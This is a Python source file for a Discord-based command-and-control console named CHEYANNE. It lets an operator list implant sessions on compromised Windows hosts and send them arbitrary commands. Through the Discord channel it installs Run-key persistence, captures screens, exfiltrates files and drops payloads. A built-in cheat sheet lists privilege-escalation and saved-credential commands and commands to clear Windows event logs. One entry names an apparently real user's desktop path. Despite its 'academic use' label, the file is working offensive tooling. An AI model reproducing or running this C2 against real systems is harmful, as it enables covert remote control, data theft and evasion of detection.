"""
vader_discord_c2.py — CHEYANNE Discord C2 Interactive Shell
===================================================
22DIV / george wu
Classification: UNCLASSIFIED // ACADEMIC USE ONLY

Same interface as cheyanne_c2 but uses Discord as transport.
No port forwarding needed — works across the internet.

Usage:
    python shell\\cheyanne_discord_c2.py
    python shell\\cheyanne_discord_c2.py --env path\\to\\.env

Console commands:
    sessions / ls          List active implant sessions
    interact <id> / use    Enter interactive shell for session
    cmd <session> <cmd>    Send one-off command
    kill <id>              Send EXIT to implant
    recon <id>             Re-run recon on target
    persist <id>           Install persistence on target
    screenshot <id>        Capture target screen
    upload <id> <path>     Exfil file from target
    download <id> <url> <path>  Drop file to target
    log                    Show command history
    train                  Post training log to #c2
    back                   Return from interactive session
    help                   Show commands
    exit                   Shutdown
"""

import os
import sys
import json
import time
import threading
from datetime import datetime

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.error
    HAS_REQUESTS = False

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        os.environ.setdefault("PYTHONIOENCODING", "utf-8")

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(SCRIPT_DIR)
LOG_DIR = os.path.join(ROOT_DIR, "reporting", "c2_logs")

GREEN  = "\033[38;2;0;255;65m"
RED    = "\033[38;2;255;68;68m"
AMBER  = "\033[38;2;255;176;0m"
CYAN   = "\033[38;2;0;229;255m"
DIM    = "\033[38;2;85;85;85m"
MUTED  = "\033[38;2;136;136;136m"
TEXT   = "\033[38;2;204;204;204m"
WHITE  = "\033[38;2;255;255;255m"
BOLD   = "\033[1m"
RST    = "\033[0m"


def load_env(env_path=None):
    paths = [
        env_path,
        os.path.join(ROOT_DIR, ".env"),
        os.path.join(ROOT_DIR, "agent", ".env"),
    ]
    for p in paths:
        if p and os.path.exists(p):
            with open(p) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#") and "=" in line:
                        k, v = line.split("=", 1)
                        os.environ.setdefault(k.strip(), v.strip())
            return p
    return None


def http_post(url, payload, headers=None):
    if HAS_REQUESTS:
        r = requests.post(url, json=payload, headers=headers or {}, timeout=10)
        return r.status_code
    else:
        data = json.dumps(payload).encode("utf-8")
        hdrs = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, data=data, headers=hdrs)
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            return resp.status
        except urllib.error.HTTPError as e:
            return e.code


def http_get(url, headers=None):
    if HAS_REQUESTS:
        r = requests.get(url, headers=headers or {}, timeout=10)
        return r.status_code, r.json() if r.status_code == 200 else []
    else:
        hdrs = {"User-Agent": "Mozilla/5.0"}
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, headers=hdrs)
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            return resp.status, json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            return e.code, []


class DiscordSession:
    def __init__(self, session_id, hostname, data=""):
        self.id = session_id
        self.hostname = hostname
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.recon_data = data
        self.user = ""
        self.ip = ""
        self.os_info = ""

        for line in data.split("\n"):
            line = line.strip()
            if line.startswith("user:"):
                self.user = line.split(":", 1)[1].strip()
            elif line.startswith("hostname:"):
                self.hostname = line.split(":", 1)[1].strip()
            elif "IPv4 Address" in line and ":" in line:
                self.ip = line.rsplit(":", 1)[1].strip().rstrip("(Preferred)")
            elif line.startswith("os:"):
                self.os_info = line.split(":", 1)[1].strip()

    def tag(self):
        parts = []
        if self.hostname:
            parts.append(self.hostname)
        if self.user:
            parts.append(self.user)
        return "\\".join(parts) if parts else self.id

    def age(self):
        delta = datetime.now() - self.first_seen
        mins = int(delta.total_seconds() / 60)
        if mins < 1:
            return f"{int(delta.total_seconds())}s"
        if mins < 60:
            return f"{mins}m"
        return f"{mins // 60}h{mins % 60}m"

    def since_last(self):
        delta = datetime.now() - self.last_seen
        secs = int(delta.total_seconds())
        if secs < 60:
            return f"{secs}s ago"
        return f"{secs // 60}m ago"


class VaderDiscordC2:
    def __init__(self, webhook_url, bot_token, channel_id):
        self.webhook_url = webhook_url
        self.bot_token = bot_token
        self.channel_id = channel_id
        self.sessions = {}
        self.running = True
        self.active_session = None
        self.command_log = []
        self.last_msg_id = None
        self.poll_thread = None

        os.makedirs(LOG_DIR, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_path = os.path.join(LOG_DIR, f"discord_c2_{ts}.jsonl")

    def log_event(self, event_type, session_id=None, data=None):
        entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "event": event_type,
        }
        if session_id:
            entry["session_id"] = session_id
        if data:
            entry["data"] = str(data)[:2000]
        with open(self.log_path, "a") as f:
            f.write(json.dumps(entry) + "\n")
        self.command_log.append(entry)

    def send_command(self, session_id, command):
        payload = {"type": "cmd", "session": session_id, "command": command}
        content = json.dumps(payload)
        status = http_post(self.webhook_url, {"content": content})
        self.log_event("command_sent", session_id, command)
        return status

    def read_channel(self, limit=50):
        url = f"https://discord.com/api/v10/channels/{self.channel_id}/messages?limit={limit}"
        headers = {"Authorization": f"Bot {self.bot_token}"}
        status, messages = http_get(url, headers)
        if status != 200:
            return []
        return messages

    def _ensure_session(self, session_id, hostname="unknown", data=""):
        if session_id not in self.sessions:
            s = DiscordSession(session_id, hostname, data)
            self.sessions[session_id] = s
            self.notify(f"{GREEN}[+] New session: {session_id} ({s.tag()}){RST}")
            self.log_event("session_new", session_id, s.tag())
        else:
            self.sessions[session_id].last_seen = datetime.now()

    def parse_messages(self, messages):
        for msg in reversed(messages):
            msg_id = msg.get("id", "")
            content = msg.get("content", "").strip()

            if self.last_msg_id and int(msg_id) <= int(self.last_msg_id):
                continue

            try:
                data = json.loads(content)
            except (json.JSONDecodeError, ValueError):
                # truncated JSON — try to extract session/hostname from partial content
                if '"session"' in content and '"type"' in content:
                    import re
                    sid_m = re.search(r'"session"\s*:\s*"([a-f0-9]+)"', content)
                    host_m = re.search(r'"hostname"\s*:\s*"([^"]+)"', content)
                    type_m = re.search(r'"type"\s*:\s*"([^"]+)"', content)
                    if sid_m and type_m:
                        sid = sid_m.group(1)
                        hostname = host_m.group(1) if host_m else "unknown"
                        self._ensure_session(sid, hostname)
                self.last_msg_id = msg_id
                continue

            msg_type = data.get("type")
            session_id = data.get("session")
            hostname = data.get("hostname", "unknown")

            if not session_id:
                self.last_msg_id = msg_id
                continue

            if msg_type == "recon":
                self._ensure_session(session_id, hostname, data.get("data", ""))
                if session_id in self.sessions:
                    self.sessions[session_id].recon_data = data.get("data", "")

            elif msg_type == "output":
                self._ensure_session(session_id, hostname)
                output = data.get("data", "")
                if self.active_session and self.active_session.id == session_id:
                    print(f"\n{output}")
                else:
                    preview = output[:120].replace("\n", " ")
                    self.notify(f"{CYAN}[<] {session_id}: {preview}{RST}")
                self.log_event("output_recv", session_id, output)

            elif msg_type == "heartbeat":
                self._ensure_session(session_id, hostname)

            self.last_msg_id = msg_id

    def poll_loop(self):
        while self.running:
            try:
                messages = self.read_channel(limit=10)
                if messages:
                    self.parse_messages(messages)
            except Exception:
                pass
            time.sleep(3)

    def notify(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        if self.active_session:
            sys.stdout.write(f"\n  [{ts}] {msg}\n")
            sys.stdout.flush()
        else:
            print(f"\n  [{ts}] {msg}")

    def cmd_sessions(self):
        if not self.sessions:
            print(f"  {MUTED}No sessions. Waiting for implant check-ins...{RST}")
            return

        print()
        print(f"  {CYAN}  ID        Hostname                  User               IP              Last Seen{RST}")
        print(f"  {CYAN}  ──        ────────                  ────               ──              ─────────{RST}")
        for sid, s in self.sessions.items():
            print(f"    {GREEN}{sid}{RST}  {WHITE}{s.hostname:<26s}{RST}{MUTED}{s.user:<19s}{RST}{DIM}{s.ip:<16s}{RST}{AMBER}{s.since_last()}{RST}")
        print()
        print(f"  {DIM}Total: {len(self.sessions)} session(s){RST}")
        print()

    def cmd_interact(self, session_id):
        if session_id not in self.sessions:
            if len(self.sessions) == 1:
                session_id = list(self.sessions.keys())[0]
            else:
                print(f"  {RED}[!] Session {session_id} not found{RST}")
                return

        s = self.sessions[session_id]
        self.active_session = s
        print(f"\n  {GREEN}[*] Interacting with {s.id} ({s.tag()}){RST}")
        print(f"  {AMBER}[*] Commands are sent via Discord — expect ~5s latency{RST}")
        print(f"  {AMBER}[*] Type 'back' to return to console{RST}\n")

        try:
            while self.running:
                try:
                    prompt = f"  {RED}{s.hostname}{RST}{DIM}>{RST} "
                    cmd = input(prompt)
                except (EOFError, KeyboardInterrupt):
                    break

                cmd = cmd.strip()
                if not cmd:
                    continue
                if cmd.lower() == "back":
                    break

                upper = cmd.upper()
                if upper == "PERSIST":
                    self.send_command(session_id, "PERSIST")
                    print(f"  {AMBER}[>] PERSIST sent{RST}")
                elif upper == "SCREENSHOT":
                    self.send_command(session_id, "SCREENSHOT")
                    print(f"  {AMBER}[>] SCREENSHOT sent{RST}")
                elif upper == "RECON":
                    self.send_command(session_id, "RECON")
                    print(f"  {AMBER}[>] RECON sent{RST}")
                elif upper.startswith("UPLOAD "):
                    self.send_command(session_id, cmd)
                    print(f"  {AMBER}[>] UPLOAD sent{RST}")
                elif upper.startswith("DOWNLOAD "):
                    self.send_command(session_id, cmd)
                    print(f"  {AMBER}[>] DOWNLOAD sent{RST}")
                elif upper == "EXIT":
                    self.send_command(session_id, "EXIT")
                    print(f"  {RED}[>] EXIT sent — implant will terminate{RST}")
                    break
                else:
                    self.send_command(session_id, cmd)
                    print(f"  {DIM}[>] Sent: {cmd}{RST}")

                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n  {MUTED}[*] Returning to console...{RST}")

        self.active_session = None
        print(f"\n  {CYAN}[*] Back to CHEYANNE Discord C2 console{RST}\n")

    def cmd_log(self):
        if not self.command_log:
            print(f"  {MUTED}No log entries.{RST}")
            return
        print(f"\n  {CYAN}── Command Log ──{RST}\n")
        for entry in self.command_log[-30:]:
            ts = entry.get("timestamp", "?")
            ev = entry.get("event", "?")
            sid = entry.get("session_id", "")
            data = entry.get("data", "")
            if ev == "command_sent":
                print(f"    {ts} | {GREEN}{sid[:8]}{RST} | {AMBER}CMD:{RST} {data}")
            elif ev == "output_recv":
                preview = data[:80].replace("\n", " ")
                print(f"    {ts} | {GREEN}{sid[:8]}{RST} | {CYAN}OUT:{RST} {preview}")
            else:
                print(f"    {ts} | {DIM}{ev}{RST}")
        print()

    def cmd_train(self, text=""):
        msg = text or f"[TRAINING LOG] {datetime.now().strftime('%Y-%m-%d %H:%M')}\nPhase: active C2\nSessions: {len(self.sessions)}\nCommands sent: {sum(1 for e in self.command_log if e.get('event') == 'command_sent')}"
        http_post(self.webhook_url, {"content": msg})
        print(f"  {GREEN}[*] Training log posted to #c2{RST}")

    def cmd_help(self):
        print(f"""
  {CYAN}── CHEYANNE Discord C2 Commands ──{RST}

    {WHITE}sessions / ls{RST}              List active sessions
    {WHITE}interact <id> / use{RST}        Enter interactive shell
    {WHITE}cmd <session> <command>{RST}    Send one-off command
    {WHITE}recon <id>{RST}                 Re-run recon on target
    {WHITE}persist <id>{RST}               Install persistence
    {WHITE}screenshot <id>{RST}            Capture target screen
    {WHITE}upload <id> <path>{RST}         Exfil file from target
    {WHITE}download <id> <url> <dst>{RST}  Drop file to target
    {WHITE}kill <id>{RST}                  Kill implant on target
    {WHITE}killswitch{RST}                 Kill ALL sessions
    {WHITE}ref{RST}                        Target command cheat sheet
    {WHITE}log{RST}                        Show command history
    {WHITE}train{RST}                      Post training log to #c2
    {WHITE}back{RST}                       Return from interactive
    {WHITE}help{RST}                       Show this help
    {WHITE}exit / quit{RST}                Shutdown
""")

    def cmd_ref(self):
        print(f"""
  {CYAN}── Target Command Reference ──{RST}

  {AMBER}RECON & ENUMERATION{RST}
    whoami                               Current user
    whoami /priv                         Privileges (look for SeDebug, SeImpersonate)
    net user                             All local users
    net localgroup Administrators        Who has admin
    systeminfo                           OS version, patches, domain
    ipconfig /all                        Network config + DNS
    arp -a                               ARP table (other hosts on LAN)
    netstat -ano                         Active connections + PIDs
    tasklist                             Running processes
    tasklist /FI "IMAGENAME eq MsMpEng.exe"   Defender running?
    reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall   Installed software

  {AMBER}PERSISTENCE{RST}
    PERSIST                              CHEYANNE: add HKCU Run key
    schtasks /query /fo LIST             List scheduled tasks
    reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run   Check Run keys
    sc query                             List services

  {AMBER}FILE OPS{RST}
    dir C:\\Users\\"Ghaleb Jomma"\\Desktop   List desktop
    type <file>                          Read a file
    UPLOAD <path>                        CHEYANNE: exfil file to #c2
    DOWNLOAD <url> <path>                CHEYANNE: drop file to target

  {AMBER}PROCESS MANAGEMENT{RST}
    tasklist /FI "PID eq <pid>"          Check specific PID
    taskkill /F /PID <pid>               Force kill by PID
    taskkill /F /IM <name>.exe           Force kill by name
    wmic process where name="<name>" get ProcessId   Find PID by name

  {AMBER}PRIVESC HUNTING{RST}
    whoami /priv                         Token privileges
    cmdkey /list                         Saved credentials
    schtasks /query /fo LIST /v          Verbose scheduled tasks
    icacls "C:\\Program Files"            Weak folder perms
    reg query HKLM\\SYSTEM\\CurrentControlSet\\Services   Service paths (unquoted?)
    netsh advfirewall show allprofiles   Firewall rules

  {AMBER}OPSEC{RST}
    RECON                                CHEYANNE: full re-enumerate
    SCREENSHOT                           CHEYANNE: screen dimensions
    EXIT                                 CHEYANNE: kill implant
    del /f <file>                        Delete a file
    wevtutil cl Security                 Clear security log (needs admin)
    wevtutil cl System                   Clear system log (needs admin)
""")

    def cmd_killswitch(self):
        if not self.sessions:
            print(f"  {MUTED}No active sessions.{RST}")
            return
        count = len(self.sessions)
        print(f"  {RED}[!] KILLSWITCH — sending EXIT to {count} session(s){RST}")
        for sid in list(self.sessions.keys()):
            self.send_command(sid, "EXIT")
            print(f"  {RED}  [-] EXIT → {sid}{RST}")
        self.log_event("killswitch", data=f"{count} sessions killed")

    def banner(self):
        print()
        print(f"  {CYAN}╔══════════════════════════════════════════════════════╗")
        print(f"  ║  CHEYANNE DISCORD C2 — PALPATINE MODE               ║")
        print(f"  ║  22DIV / george wu                                   ║")
        print(f"  ╚══════════════════════════════════════════════════════╝{RST}")
        print(f"  {CYAN}│{RST}  Channel:  {self.channel_id}")
        print(f"  {CYAN}│{RST}  Log:      {self.log_path}")
        print(f"  {CYAN}│{RST}  Started:  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        ok = "OK" if self.bot_token else "MISSING"
        tok_color = GREEN if self.bot_token else RED
        print(f"  {CYAN}│{RST}  Token:    {tok_color}{ok}{RST}")
        print(f"  {CYAN}╘══════════════════════════════════════════════════════{RST}")
        print()
        print(f"  {GREEN}[*] Polling #c2 for implant check-ins...{RST}")
        print(f"  {AMBER}[*] Type 'help' for commands{RST}")
        print()

    def run(self):
        if sys.platform == "win32":
            os.system("")

        self.banner()
        self.log_event("c2_start", data="discord_transport")

        self.poll_thread = threading.Thread(target=self.poll_loop, daemon=True)
        self.poll_thread.start()

        messages = self.read_channel(limit=20)
        if messages:
            self.parse_messages(messages)
            if self.sessions:
                print(f"  {GREEN}[+] Found {len(self.sessions)} existing session(s){RST}\n")

        try:
            while self.running:
                try:
                    raw = input(f"  {CYAN}cheyanne-discord>{RST} ")
                except (EOFError, KeyboardInterrupt):
                    print()
                    break

                parts = raw.strip().split()
                if not parts:
                    continue

                cmd = parts[0].lower()
                args = parts[1:]

                if cmd in ("sessions", "ls"):
                    self.cmd_sessions()
                elif cmd in ("interact", "use"):
                    sid = args[0] if args else ""
                    self.cmd_interact(sid)
                elif cmd == "cmd" and len(args) >= 2:
                    sid = args[0]
                    command = " ".join(args[1:])
                    self.send_command(sid, command)
                    print(f"  {DIM}[>] Sent to {sid}: {command}{RST}")
                elif cmd == "recon" and args:
                    self.send_command(args[0], "RECON")
                    print(f"  {AMBER}[>] RECON sent to {args[0]}{RST}")
                elif cmd == "persist" and args:
                    self.send_command(args[0], "PERSIST")
                    print(f"  {AMBER}[>] PERSIST sent to {args[0]}{RST}")
                elif cmd == "screenshot" and args:
                    self.send_command(args[0], "SCREENSHOT")
                    print(f"  {AMBER}[>] SCREENSHOT sent to {args[0]}{RST}")
                elif cmd == "upload" and len(args) >= 2:
                    self.send_command(args[0], f"UPLOAD {args[1]}")
                    print(f"  {AMBER}[>] UPLOAD sent{RST}")
                elif cmd == "download" and len(args) >= 3:
                    self.send_command(args[0], f"DOWNLOAD {args[1]} {args[2]}")
                    print(f"  {AMBER}[>] DOWNLOAD sent{RST}")
                elif cmd == "kill" and args:
                    self.send_command(args[0], "EXIT")
                    print(f"  {RED}[>] EXIT sent to {args[0]}{RST}")
                elif cmd == "ref":
                    self.cmd_ref()
                elif cmd == "killswitch":
                    self.cmd_killswitch()
                elif cmd == "log":
                    self.cmd_log()
                elif cmd == "train":
                    self.cmd_train(" ".join(args) if args else "")
                elif cmd == "help":
                    self.cmd_help()
                elif cmd in ("exit", "quit"):
                    break
                else:
                    print(f"  {RED}[!] Unknown: {cmd}. Type 'help'{RST}")

        except KeyboardInterrupt:
            print()

        self.running = False
        self.log_event("c2_stop")
        print(f"\n  {MUTED}[*] CHEYANNE Discord C2 shutting down...{RST}")
        print(f"  {MUTED}[*] Log: {self.log_path}{RST}")


def main():
    env_path = None
    for i, arg in enumerate(sys.argv):
        if arg == "--env" and i + 1 < len(sys.argv):
            env_path = sys.argv[i + 1]

    loaded = load_env(env_path)

    webhook = os.environ.get("DISCORD_C2_WEBHOOK", "")
    token = os.environ.get("DISCORD_BOT_TOKEN", "")
    channel = os.environ.get("DISCORD_C2_CHANNEL", "")

    if not webhook:
        print(f"  {RED}[!] DISCORD_C2_WEBHOOK not set{RST}")
        print(f"  {MUTED}    Set in .env or cheyanne/.env{RST}")
        sys.exit(1)

    if not channel:
        print(f"  {RED}[!] DISCORD_C2_CHANNEL not set{RST}")
        sys.exit(1)

    c2 = VaderDiscordC2(webhook, token, channel)
    c2.run()


if __name__ == "__main__":
    main()
